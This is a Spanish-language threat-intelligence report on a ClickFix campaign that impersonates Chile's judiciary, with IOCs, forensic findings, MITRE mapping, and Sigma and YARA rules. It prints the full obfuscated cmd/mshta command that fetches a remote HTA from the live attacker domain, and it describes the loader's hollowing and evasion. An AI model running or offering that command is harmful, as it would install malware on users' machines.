# ClickFix suplantando al Poder Judicial de Chile — `pjud[.]online` → `mshta` → JScript/VBScript → AutoIt → DLL Delphi

> **Tipo:** Cyber Threat Intelligence / Malware Analysis  
> **Estado:** infraestructura activa observada durante septiembre de 2026  
> **Alcance:** este repositorio documenta infraestructura, comportamiento, TTPs, artefactos e indicadores asociados a una campaña maliciosa que suplanta al Poder Judicial de Chile.
---

## Resumen

Se identificó una campaña de **ingeniería social ClickFix** que utiliza el dominio `pjud[.]online`, visualmente cercano al dominio institucional legítimo `pjud.cl`, para inducir a usuarios a ejecutar una instrucción desde Windows. La ejecución inicial observada construye de forma ofuscada una llamada a `mshta.exe` contra un HTA remoto alojado en infraestructura controlada por el atacante.

La cadena continúa mediante **JScript, WMI, VBScript, COM scriptlets y AutoIt**, realiza fingerprinting del host y comprobaciones anti-VM/anti-sandbox, registra telemetría del endpoint y recupera etapas adicionales desde un backend con rutas en portugués (`estagio`, `registrar`, `modulo`). El artefacto AutoIt analizado contiene una **DLL PE32 x86 compatible con Delphi/Embarcadero** con indicadores estáticos compatibles con manipulación de procesos y **process hollowing**, además de capacidades de red, acceso al registro y lógica de evasión.

Microsoft Defender XDR observó y bloqueó repetidamente la línea de comandos ClickFix en un endpoint protegido, clasificándola como `Trojan:Win32/ClickFix.Q!ml`. En el paquete forense disponible **no se encontró evidencia suficiente para confirmar que las etapas posteriores se ejecutaran exitosamente en ese endpoint**, por lo que el caso concreto se clasifica como **True Positive — Prevented/Blocked**, mientras que la reconstrucción de la cadena completa proviene del análisis controlado de la infraestructura y los artefactos recuperados.

La campaña presenta similitudes con infraestructura y loaders asociados públicamente al ecosistema **Emmenhtal / IDATDropper / PEAKLIGHT**, pero la evidencia disponible no permite una atribución definitiva de familia, actor o nacionalidad.

### IOC principal — referencia rápida

| Tipo | Indicador | Prioridad | Acción defensiva |
|---|---|---:|---|
| Dominio malicioso | `pjud[.]online` | **Muy alta** | Bloquear por FQDN/dominio y buscar retrospectivamente |
| URL inicial observada | `hxxps://pjud[.]online/h/estagio1.php?r=3F1477F15398D1` | **Muy alta** | Bloquear y correlacionar con `mshta.exe` |
| Dominio legítimo | `pjud.cl` | — | **No bloquear** |

> La lista completa de dominios, rutas, artefactos de endpoint y hashes se encuentra en la sección **Indicadores de compromiso (IOCs)**.

### Hallazgos clave

- `pjud[.]online` funciona como infraestructura maliciosa de entrega y telemetría; **no corresponde al dominio oficial del Poder Judicial de Chile**.
- La ejecución inicial utiliza **ClickFix + `cmd.exe` + `mshta.exe`** para recuperar un HTA remoto.
- El primer stage realiza fingerprinting mediante **JScript/WMI** y comprobaciones anti-VM/anti-sandbox.
- Las etapas posteriores utilizan **VBScript, `ExecuteGlobal` y COM `script:`** para continuar la cadena.
- Se observaron escrituras en `HKCU\Software\FluxEngine\Desktop\` y artefactos bajo `%APPDATA%\HWiN*`.
- El backend entrega un ZIP mono-entrada asociado a AutoIt; se observó **variabilidad entre solicitudes**, por lo que los hashes individuales tienen baja durabilidad defensiva.
- Del artefacto AutoIt se extrajo una **DLL Delphi x86** con APIs y cadenas compatibles con **process hollowing**, evasión, comunicaciones HTTP(S) y acceso al registro.
- La DLL contiene referencias a la API de Cloudflare y una **credencial tipo Bearer embebida**. Su valor se omite deliberadamente del reporte público y no fue utilizado para acceder a infraestructura de terceros.
- Se observaron **1.738 identificadores hexadecimales únicos** en telemetría asociada al backend durante la ventana analizada. No se asume una equivalencia 1:1 entre estos identificadores y equipos efectivamente comprometidos.
- La evidencia previa al paso ClickFix no permite afirmar un vector inicial único sin observar el señuelo correspondiente.

---

## Señuelo observado
<img width="779" height="790" alt="c729f888-f919-4ed6-8ee0-c87d9b2a6215" src="https://github.com/user-attachments/assets/ecd76ded-aac4-453b-82a7-25dec0125f05" />

---

## Juicios analíticos y nivel de confianza

| Evaluación | Confianza | Fundamentación |
|---|---:|---|
| `pjud[.]online` corresponde a infraestructura maliciosa que suplanta al PJUD | **Alta** | Cadena de stages, telemetría, entrega de payload y similitud deliberada con `pjud.cl` |
| La técnica de ejecución inicial corresponde a ClickFix | **Alta** | Ejecución manual inducida + línea de comandos + `mshta` remoto |
| Existe abuso de `mshta.exe` para recuperar código remoto | **Alta** | URL remota observada directamente en la cadena |
| El stage inicial realiza fingerprinting y anti-VM/anti-sandbox | **Alta** | JScript/WMI y comprobaciones de BIOS, MAC, hipervisores y artefactos de análisis |
| El backend reutiliza una estructura común entre múltiples dominios/campañas | **Alta** | Rutas y respuestas consistentes observadas en el clúster |
| El artefacto entregado presenta variabilidad entre solicitudes | **Alta** para las muestras analizadas | Tres recuperaciones controladas produjeron contenedores/tamaños/nombres de entrada diferentes |
| El artefacto AutoIt encapsula una DLL Delphi con capacidad probable de process hollowing | **Alta (estática)** | `CreateProcessW`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`, `VirtualAllocEx` y cadenas explícitas de hollowing |
| La DLL contiene indicadores de capacidad potencial de persistencia mediante Run Keys | **Media-baja** | Existe la ruta `CurrentVersion\Run` y APIs de registro, pero no se confirmó la escritura en ejecución real |
| La campaña pertenece a Emmenhtal/IDATDropper/PEAKLIGHT | **Media-baja** | Similitudes de TTP, rutas y ecosistema AutoIt; flujo final distinto y sin configuración de familia concluyente |
| El payload final corresponde a Remcos, AsyncRAT, XWorm u otra RAT específica | **No confirmado** | No se recuperó configuración/C2/capacidades suficientes para identificar una RAT concreta |
| Los 1.738 identificadores observados representan 1.738 víctimas comprometidas | **No confirmado** | El dataset demuestra identificadores únicos del backend, no infección exitosa 1:1 |
| El operador pertenece a un actor o país específico | **No confirmado** | PT-BR y señuelos brasileños son útiles para clustering, no para atribución geográfica |

---

## Cadena de ataque observada

<img width="1448" height="1086" alt="ChatGPT Image 2 sept 2026, 09_54_31 p m" src="https://github.com/user-attachments/assets/2ed4514a-36f4-45a0-a300-f6c54a9faff4" />

> **Figura 2 — Cadena de ataque.** Flujo técnico reconstruido desde la ejecución ClickFix hasta el artefacto AutoIt y la DLL embebida. La ejecución completa fue reconstruida en análisis controlado; no se afirma que todas las etapas se hayan ejecutado en cada endpoint detectado.

```text
[1] Ingeniería social / ClickFix
        │
        │  Usuario inducido a ejecutar una instrucción desde Windows
        │
        │  Comando observado (simplificado):
        │  mshta hxxps://pjud[.]online/h/estagio1.php?r=3F1477F15398D1
        ▼
[2] HTA remoto mediante mshta.exe
        │
        │  JScript + WMI
        │  fingerprint: hostname / usuario / OS / BIOS / MAC / disco / AV
        │  anti-VM / anti-sandbox
        │  beacon a /registrar.php
        │  limpieza de cache/artefactos IE mediante ClearMyTracksByProcess
        ▼
[3] Stage2 — VBScript
        │
        │  MSXML2.ServerXMLHTTP.6.0
        │  ExecuteGlobal
        │  HKCU\Software\FluxEngine\Desktop\taskm / src
        │  %APPDATA%\HWiN* + atributos oculto/sistema
        ▼
[4] Stage3 — COM scriptlet remoto
        │
        │  GetObject("script:hxxps://pjud[.]online/h/estagioN.php")
        │  recuperación de stages adicionales
        ▼
[5] Stage4 / Stage5
        │
        │  /h/modulo.php?f=au3&t=<value>&h=<value>
        │  /api/check-remoto.php?pc=<hostname>
        │  entrega ZIP / AutoIt + polling
        ▼
[6] Artefacto AutoIt
        │
        │  ZIP mono-entrada (~1.36 MB en muestras analizadas)
        │  marcador AU3!EA06
        │  variabilidad entre solicitudes
        ▼
[7] DLL embebida — Delphi PE32 x86
        │
        │  networking / registro / cifrado
        │  anti-debug / anti-sandbox
        │  APIs compatibles con process hollowing
        │  Cloudflare API + endpoints auxiliares
        ▼
[8] Capacidad final probable
        │
        │  carga/inyección de payload adicional
        │  control/actualización remota del loader
        │  persistencia posible (no confirmada en endpoint)
        │
        └─ Familia final / RAT específica: NO CONFIRMADA
```

---

## Detección real en Microsoft Defender XDR

La campaña fue observada en un endpoint protegido por Microsoft Defender. La alerta generada fue:

`An active 'ClickFix' malware in a command line was prevented from executing`

Defender clasificó la línea como:

`Trojan:Win32/ClickFix.Q!ml`

La línea de comandos reconstruía `mshta` separando sus componentes mediante variables de entorno:

```cmd
cmd.exe /v:on /c set a=msh&& set b=ta&& set c=https://&& set d=pjud.online&& set e=/h/estagio1.php?r=3F1477F15398D1&& start /b !a!!b! !c!!d!!e!
```

Equivalente lógico:

```text
mshta hxxps://pjud[.]online/h/estagio1.php?r=3F1477F15398D1
```

Se observaron **cinco bloqueos consecutivos** de la misma cadena durante aproximadamente 15 minutos. Defender reportó en todos los casos la acción de remediación como exitosa.

### Interpretación del proceso iniciador

`explorer.exe` aparece como proceso iniciador de la línea maliciosa. Esto es compatible con un escenario ClickFix donde el usuario utiliza el cuadro **Ejecutar** (`Win + R`): `explorer.exe` corresponde al shell de Windows y no debe interpretarse por sí solo como un binario malicioso.

### Resultado forense del endpoint protegido

El Investigation Package de Microsoft Defender fue consistente con una **prevención temprana**:

- no se identificó evidencia suficiente de ejecución exitosa de los stages posteriores en los artefactos disponibles;
- no se confirmó descarga/ejecución del artefacto AutoIt en el endpoint protegido;
- no se confirmó persistencia asociada a `FluxEngine`, `%APPDATA%\HWiN*` o Run Keys de la campaña;
- una ejecución de `rundll32.exe` temporalmente cercana a uno de los bloqueos no pudo atribuirse a la campaña porque el paquete no preservó su línea de comandos;
- la recolección forense no incluyó todas las claves `RunMRU` y directorios `%TEMP%` del usuario de dominio afectado, por lo que la ausencia de evidencia no debe interpretarse como prueba absoluta de inexistencia.

**Clasificación recomendada para el endpoint observado:** `True Positive — Prevented/Blocked; sin evidencia de compromiso posterior en los artefactos disponibles`.

---

## Infraestructura y clustering

La infraestructura observada no parece limitada a `pjud[.]online`. El patrón de rutas —especialmente `/h/estagio1.php`— aparece en muestras públicas y en dominios con temáticas de señuelo diferentes.

### Dominios/subdominios asociados al clúster

| Dominio | Primer uso/registro observado | Tema | Estado durante análisis |
|---|---|---|---|
| `acessoprincipalconvite[.]com` | 2026-01 | convite/acesso | observado activo |
| `boletos-notas[.]com` / `nfe.boletos-notas[.]com` | 2026-02 / 2026-08 | NF-e + boleto | histórico |
| `nfe-2viaeletronica[.]online` | 2026-05 | NF-e | histórico |
| `nf-edigital[.]com` | 2026-05 | NF-e | observado activo |
| `m[.]acrobat[.]lat` | 2026-05 | Adobe Acrobat | histórico |
| `adobepdf[.]cc` | 2026-05 | Adobe PDF | histórico |
| `k[.]upgrades[.]lat` | 2026-05 | upgrade | histórico |
| `worldpress[.]biz` | 2026-05 | WordPress/genérico | histórico |
| `br-adobe[.]lat` | 2026-06 | Adobe BR | histórico |
| `nfe-online[.]com` | 2026-06 | NF-e | histórico |
| `ma-pdffiller[.]lat` | 2026-06 | PDF Filler | histórico |
| `min-pdf[.]lat` | 2026-07 | PDF | histórico |
| `pjud[.]online` | 2026-09-01 | Poder Judicial de Chile | activo durante análisis |

### Clustering técnico

Los siguientes elementos son más útiles que un hash aislado para buscar infraestructura relacionada:

- `/h/estagio1.php?r=<...>`
- `/h/estagio2.php`
- `/h/estagio3.php`
- `/h/estagio4.php`
- `/h/estagio5.php`
- `/registrar.php`
- `/h/modulo.php?f=au3`
- `/api/check-remoto.php?pc=`
- respuestas PT-BR del backend;
- `FluxEngine`;
- `%APPDATA%\HWiN*`;
- `AU3!EA06`;
- combinación AutoIt + DLL Delphi + indicadores de hollowing.

### Evidencia pública relacionada

Muestras públicas de 2026 han utilizado la misma ruta `/h/estagio1.php` junto con `cmd`/`mshta` y etiquetas de loader/stealer/AutoIt, lo que refuerza que la ruta pertenece a una infraestructura reutilizada y no a un recurso benigno aislado.

---

## Indicadores de compromiso (IOCs)

### Dominio e infraestructura

| Tipo | Indicador | Prioridad | Comentario |
|---|---|---:|---|
| Dominio | `pjud[.]online` | **Muy alta** | Infraestructura de campaña; suplantación de `pjud.cl` |
| Dominio legítimo de referencia | `pjud.cl` | — | Dominio institucional; **no bloquear** |
| Nameserver | `irma.ns.cloudflare.com` | Baja | Cloudflare compartido |
| Nameserver | `jake.ns.cloudflare.com` | Baja | Cloudflare compartido |
| IP Cloudflare observada | `172.67.206.246` | Baja | CDN compartido; no bloquear aisladamente |
| IP Cloudflare observada | `104.21.69.94` | Baja | CDN compartido; no bloquear aisladamente |
| Server header observado | `Apache/2.4.58 (Ubuntu)` | Baja | Fingerprint débil; no identifica el origen de forma concluyente |

### Rutas del backend

| Ruta / patrón | Función observada |
|---|---|
| `/h/estagio1.php?r=<token>` | HTA / stage inicial |
| `/registrar.php?dominio=<...>&pc=<...>&user=<...>&os=<...>&vm=<...>&av=<...>` | Telemetría/fingerprinting |
| `/h/estagio2.php?r=<token>` | Stage VBScript |
| `/registrar.php?acao=log&status=estagio2` | Registro de estado |
| `/h/estagio3.php?r=<token>` | Stage VBScript |
| `/h/estagio4.php` | Scriptlet/stage remoto |
| `/h/estagio5.php?t=<value>` | Scriptlet/stage remoto |
| `/h/modulo.php?f=au3&t=<value>&h=<value>` | Entrega AutoIt/ZIP |
| `/api/check-remoto.php?pc=<hostname>` | Polling/orquestación por hostname |

### Artefactos de endpoint

| Tipo | Indicador / comportamiento | Prioridad |
|---|---|---:|
| Registro | `HKCU\Software\FluxEngine\Desktop\taskm` | Alta |
| Registro | `HKCU\Software\FluxEngine\Desktop\src` | Alta |
| Archivo/patrón | `%APPDATA%\HWiN*` | Alta |
| Registro/cadena DLL | `Software\HWiNFO32\Sens` | Media |
| Atributos | `attrib +h +s` | Media-alta en contexto |
| Ejecución | `mshta.exe` con URL externa | Alta |
| Ejecución | `RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8` | Media-alta en contexto |
| Script | `ExecuteGlobal` + `GetObject("script:hxxps://...")` | Alta |
| Payload | `AU3!EA06` | Media-alta |
| DLL | `d3dx9_43.bin` | Media; requiere correlación con el loader |

### Hashes de muestras

| Artefacto | Hash | Uso |
|---|---|---|
| DLL Delphi embebida | SHA-256 `7040370d8d09dc735d3ae9a77fe4b4c8e3f97c64efb60d4a962337fd6b16b114` | IOC de muestra / pivot |
| DLL Delphi embebida | MD5 `92f38d9e2bb08533fb77545a5fb006b7` | IOC de muestra / pivot |
| Artefacto AutoIt recuperado | SHA-256 `675e661a03e51c31d9e6361615e71cb8ed0c5847593825894c8239501f7b28e5` | Referencial; no usar como único control |

---

## Telemetría del backend: 1.738 identificadores únicos

Durante la ventana analizada se obtuvo un dataset con el campo `hex_victima`, compuesto por **1.738 valores únicos de 16 caracteres hexadecimales**.

Ventana temporal registrada por el dataset:

- inicio observado: `2026-09-01 21:10`;
- fin observado: `2026-09-03 06:36`;
- mayor concentración de registros: `2026-09-02`.

Distribución observada:

| Fecha | Identificadores únicos registrados |
|---|---:|
| 2026-09-01 | 2 |
| 2026-09-02 | 1.606 |
| 2026-09-03 | 130 |
| **Total** | **1.738** |

> **Precaución analítica:** el nombre del campo sugiere que el backend lo utiliza como identificador de víctima/sesión, pero no se ha demostrado que cada valor corresponda a una infección exitosa ni a un equipo único. Debe describirse como **identificadores únicos observados**, no como “1.738 equipos comprometidos”.

---

## Análisis de la DLL embebida

La DLL extraída del artefacto AutoIt presenta las siguientes características:

| Propiedad | Valor |
|---|---|
| Formato | PE32 DLL |
| Arquitectura | x86 / i386 |
| Secciones | 10 |
| Tamaño | ~1.83 MB |
| Timestamp PE | `2026-09-02 00:55:04 UTC` — tratar como metadato de baja confianza |
| SHA-256 | `7040370d8d09dc735d3ae9a77fe4b4c8e3f97c64efb60d4a962337fd6b16b114` |

### Capacidades estáticas relevantes

Importaciones observadas incluyen:

- `ReadProcessMemory`
- `WriteProcessMemory`
- `CreateProcessW`
- `SetThreadContext`
- `GetThreadContext`
- `ResumeThread`
- `VirtualAlloc`
- `VirtualAllocEx`
- `IsDebuggerPresent`
- WinINet / WinHTTP
- BCrypt
- APIs extensas de registro (`RegCreateKeyExW`, `RegSetValueExW`, `RegQueryValueExW`, etc.)

La combinación `CreateProcessW` + `WriteProcessMemory` + `SetThreadContext` + `ResumeThread` + `VirtualAllocEx`, junto con cadenas explícitas como:

```text
HOLLOW_DIR
hollowing_sucesso
hollowing_falhou
```

es altamente compatible con una implementación de **Process Hollowing (MITRE ATT&CK T1055.012)**.

### Cadenas de interés

```text
Software\FluxEngine\Desktop
Software\Microsoft\Windows\CurrentVersion\Run
vm_detectada
dll_sandbox
moscow_sandbox
/api/upload-source.php?action=list
/api/source-file.php?f=
https://api.cloudflare.com/client/v4/
http://ip-api.com/line/
/registrar.php?acao=log&status=
d3dx9_43.bin
```

### Exposición de credenciales

La DLL contiene una **cadena tipo `Bearer` aparentemente destinada a la API de Cloudflare**.

El valor completo:

- **NO se publica como IOC**;
- **NO debe utilizarse para autenticación o enumeración**;
- debe conservarse únicamente como evidencia y, si corresponde, compartirse de forma privada con CSIRT/CERT y el proveedor afectado.

Su presencia constituye una **exposición OPSEC relevante del tooling**, independientemente de que la credencial continúe válida o no.

---

## Secuencia HTTP reconstruida

| Orden | Componente | Solicitud | Content-Type | Tamaño observado |
|---:|---|---|---|---:|
| 1 | `mshta.exe` | `GET /h/estagio1.php?r=3F...` | `text/html` | ~10 KB |
| 2 | Fingerprinting | `GET /registrar.php?...` | `application/json` | ~81 B |
| 3 | VBScript / `ExecuteGlobal` | `GET /h/estagio2.php?r=3F...` | `text/plain` | ~6.3 KB |
| 4 | Estado + stage3 | `registrar.php?acao=log` + `estagio3.php` | JSON + text | ~56 B + ~2.4 KB |
| 5 | COM `script:` | `estagio4.php` + `estagio5.php?t=...` | `text/xml` | ~8.7 KB + ~6.1 KB |
| 6 | Entrega | `GET /h/modulo.php?f=au3&t=<...>&h=<...>` | `application/octet-stream` | ~1.36 MB |
| 7 | Polling | `GET /api/check-remoto.php?pc=<hostname>` | `application/json` | ~59 B |

En el entorno de reconstrucción controlada, la recuperación del artefacto final se produjo en aproximadamente **19 segundos y 9 solicitudes HTTP(S)**. Este tiempo no debe considerarse constante de la campaña.

---

## Variabilidad del artefacto entregado

Se realizaron tres recuperaciones controladas desde `modulo.php`. Se observaron cambios en tamaño y nombre de entrada del ZIP.

| Muestra | Hash disponible | Tamaño | Entrada ZIP | Interpretación |
|---:|---|---:|---|---|
| 1 | `8040df802510ed85f55efd66a64268f4...` | 1,359,222 B | `1` | Hash incompleto; no utilizar como IOC |
| 2 | `892a8e10a11636e3a84db9b141315d5f` | 1,359,228 B | `ABCD` | Valor de 32 hex; algoritmo no confirmado |
| 3 | `675e661a03e51c31d9e6361615e71cb8ed0c5847593825894c8239501f7b28e5` | 1,359,244 B | `A1B2C3D4E5F6` | SHA-256 válido; referencial |

**Conclusión:** se confirma **variabilidad del artefacto/contenedor entre solicitudes**, pero no debe afirmarse que cada víctima reciba necesariamente un payload interno criptográficamente único.

---

## Anti-analysis y OPSEC del operador

La infraestructura presenta un nivel de OPSEC mixto.

### Controles que dificultan el análisis

- Cloudflare como reverse proxy/CDN;
- ejecución multietapa mediante LOLBins y scripting;
- anti-VM/anti-sandbox mediante WMI, BIOS, MAC, hostname y otros artefactos;
- variabilidad del artefacto entregado;
- ejecución parcialmente en memoria;
- limpieza de cache/artefactos de navegación;
- anti-debug (`IsDebuggerPresent` y cadenas de sandbox en la DLL);
- probable process hollowing como mecanismo de ejecución final.

### Exposiciones útiles para CTI

- rutas altamente características (`estagio*`, `registrar.php`, `modulo.php`, `check-remoto.php`);
- mensajes y nombres internos en PT-BR;
- rutas de registro estables (`FluxEngine`);
- marcadores AutoIt (`AU3!EA06`);
- cadenas explícitas de hollowing;
- endpoints de administración/actualización embebidos en la DLL;
- referencias directas a la API de Cloudflare;
- credencial tipo Bearer embebida y redacted en el reporte público;
- parámetros `r`, `h`, `t`, `pc` reutilizables como pivotes de investigación.

Estas exposiciones permiten crear detecciones y pivotes más duraderos que un hash o dominio individual.

---

## Detecciones recomendadas

### Endpoint / EDR

1. `cmd.exe` con concatenación de variables que reconstruyan `mshta` y una URL remota.
2. `mshta.exe` con HTTP/HTTPS externo iniciado desde contexto interactivo de usuario o `explorer.exe`.
3. `mshta.exe` seguido por WMI/JScript/VBScript, escritura en `%APPDATA%` o registro.
4. VBScript con `ExecuteGlobal` y/o `GetObject("script:http...")`.
5. Escrituras en `HKCU\Software\FluxEngine\Desktop\*`.
6. Creación de `%APPDATA%\HWiN*` seguida de `attrib +h +s`.
7. `rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 8` correlacionado con `mshta`/stages.
8. AutoIt/AU3 seguido por carga de una DLL Delphi o comportamiento de inyección.
9. Secuencia `CreateProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` → `ResumeThread`.

### Red / Proxy / NDR

1. Bloquear/alertar por `pjud[.]online` a nivel FQDN/Host/SNI.
2. Buscar secuencias contra un mismo host con `/registrar.php`, `/h/estagio*.php`, `/h/modulo.php` y `/api/check-remoto.php`.
3. Detectar `modulo.php?f=au3&t=<...>&h=<...>` con respuestas `application/octet-stream` cercanas o superiores a 1 MB.
4. Alertar por query strings que exponen `pc`, `user`, `os`, `vm` o `av` hacia dominios nuevos o de baja reputación.
5. No utilizar IPs compartidas de Cloudflare como sustituto del bloqueo por dominio.

### Sigma — ejecución ClickFix observada

```yaml
title: ClickFix Mshta Command Pattern - PJUD Campaign
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_cmd:
    Image|endswith: '\\cmd.exe'
    CommandLine|contains|all:
      - 'set a=msh'
      - 'set b=ta'
      - 'estagio1.php'
  selection_domain:
    CommandLine|contains: 'pjud.online'
  condition: selection_cmd or selection_domain
level: high
tags:
  - attack.t1204.004
  - attack.t1027
  - attack.t1218.005
```

### YARA — huella de la DLL/loader

```yara
rule PJUD_ClickFix_AutoIt_Delphi_Loader_Heuristic
{
    meta:
        description = "Behavioral strings associated with the analyzed AutoIt/Delphi loader"
        author = "kur0s4k1"
        confidence = "medium-high"

    strings:
        $mz = { 4D 5A }
        $flux = "Software\\FluxEngine\\Desktop" wide ascii
        $hollow_ok = "hollowing_sucesso" ascii wide
        $hollow_fail = "hollowing_falhou" ascii wide
        $vm = "vm_detectada" ascii wide
        $sandbox = "dll_sandbox" ascii wide
        $cfapi = "https://api.cloudflare.com/client/v4/" wide ascii
        $upload = "/api/upload-source.php?action=list" wide ascii
        $source = "/api/source-file.php?f=" wide ascii
        $reglog = "/registrar.php?acao=log&status=" wide ascii

    condition:
        $mz at 0 and 4 of ($flux,$hollow_ok,$hollow_fail,$vm,$sandbox,$cfapi,$upload,$source,$reglog)
}
```

---

## Mapeo MITRE ATT&CK

| Técnica | ID | Evidencia | Confianza |
|---|---|---|---:|
| User Execution: Malicious Copy and Paste | **T1204.004** | ClickFix / ejecución inducida | Alta |
| Obfuscated/Compressed Files and Information | **T1027** | Fragmentación `msh` + `ta`, scripts/stages | Alta |
| System Binary Proxy Execution: Mshta | **T1218.005** | HTA remoto vía `mshta.exe` | Alta |
| JavaScript/JScript | **T1059.007** | JScript en stage inicial | Alta |
| Visual Basic | **T1059.005** | VBScript / `ExecuteGlobal` | Alta |
| AutoHotKey & AutoIT | **T1059.010** | Artefacto `AU3!EA06` | Alta |
| Virtualization/Sandbox Evasion: System Checks | **T1497.001** | WMI/BIOS/MAC/VM checks | Alta |
| Modify Registry | **T1112** | `FluxEngine` y capacidad de registro | Alta |
| System Information Discovery | **T1082** | OS/BIOS/hardware | Alta |
| System Owner/User Discovery | **T1033** | usuario local | Alta |
| Security Software Discovery | **T1518.001** | AV/software de seguridad | Alta |
| Ingress Tool Transfer | **T1105** | recuperación de stages y artefactos | Alta |
| Indicator Removal | **T1070** | `ClearMyTracksByProcess` | Media |
| Process Injection: Process Hollowing | **T1055.012** | APIs + cadenas explícitas en DLL | Alta (estática) |
| Registry Run Keys / Startup Folder | **T1547.001** | ruta Run embebida; ejecución no confirmada | Media-baja |

---

## Evaluación de familia y atribución

### Emmenhtal / IDATDropper / PEAKLIGHT-like

La campaña comparte elementos con loaders documentados en ese ecosistema:

- abuso de `mshta.exe`;
- ejecución multietapa;
- scripting + AutoIt;
- evasión y fingerprinting;
- entrega de payload secundario;
- rutas `estagio*`, `registrar.php` y `modulo.php?f=au3` observadas en muestras públicas relacionadas.

No obstante, la DLL Delphi embebida y el flujo JScript → VBScript → COM scriptlet → AutoIt → DLL no permiten afirmar que se trate de una implementación canónica de Emmenhtal.

> **Clasificación recomendada:** `Emmenhtal / IDATDropper / PEAKLIGHT-like — confianza media-baja; no atribución definitiva.`

### Perfil analítico del operador

| Dimensión | Evaluación | Confianza |
|---|---|---:|
| Idioma del tooling | Backend/rutas/respuestas PT-BR | Alta |
| Modelo | Infraestructura multi-dominio/multi-campaña con backend reutilizable | Alta |
| Loader | AutoIt + DLL Delphi; Emmenhtal-like | Media |
| Ejecución final | Probable process hollowing | Alta estática |
| Persistencia | Capacidad probable; no observada en endpoint protegido | Media-baja |
| Infraestructura | Cloudflare + rotación de dominios/registrars | Alta |
| Identidad/alias | No identificado | Desconocida |

El idioma PT-BR y las campañas NF-e/boleto permiten clustering, pero **no demuestran nacionalidad o ubicación del operador**.

---

## Limitaciones

- El vector exacto anterior al paso ClickFix solo debe considerarse confirmado cuando exista evidencia del correo, SMS, mensajería o sitio inicial.
- La familia final/RAT no está confirmada mediante configuración o C2 específico.
- La función exacta de algunos parámetros (`r`, `h`, `t`) no está completamente determinada.
- Los tres artefactos recuperados demuestran variabilidad del contenedor, no necesariamente polimorfismo completo del payload interno.
- Los 1.738 identificadores del backend no equivalen automáticamente a 1.738 víctimas infectadas.
- La recolección MDE del endpoint protegido no incluyó toda la evidencia del perfil de usuario, especialmente `RunMRU`/`%TEMP%` del usuario de dominio, por lo que el veredicto “Prevented/Blocked” conserva una limitación forense explícita.
- Una ejecución temporalmente cercana de `rundll32.exe` no pudo asociarse al malware por ausencia de línea de comandos.
- Las IPs de Cloudflare son compartidas y no deben atribuirse exclusivamente al operador.
- El timestamp PE de la DLL no debe utilizarse como evidencia temporal fuerte sin corroboración adicional.

---

## Referencias técnicas

- Microsoft Threat Intelligence — [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)
- MITRE ATT&CK — [T1204.004: User Execution — Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)
- MITRE ATT&CK — [T1218.005: System Binary Proxy Execution — Mshta](https://attack.mitre.org/techniques/T1218/005/)
- MITRE ATT&CK — [T1055.012: Process Injection — Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- MITRE ATT&CK — [T1059.010: AutoHotKey & AutoIT](https://attack.mitre.org/techniques/T1059/010/)
- ANY.RUN — análisis público de infraestructura `/h/estagio1.php` con tags AutoIt/loader/stealer
- MalwareBazaar — muestras de 2026 con `/h/estagio1.php`, `cmd` y `mshta`
- Hybrid Analysis — muestras HTA públicas con la misma estructura de rutas
- Malpedia — Emmenhtal / IDATDropper / PEAKLIGHT
- Poder Judicial de Chile — [pjud.cl](https://www.pjud.cl/)

---
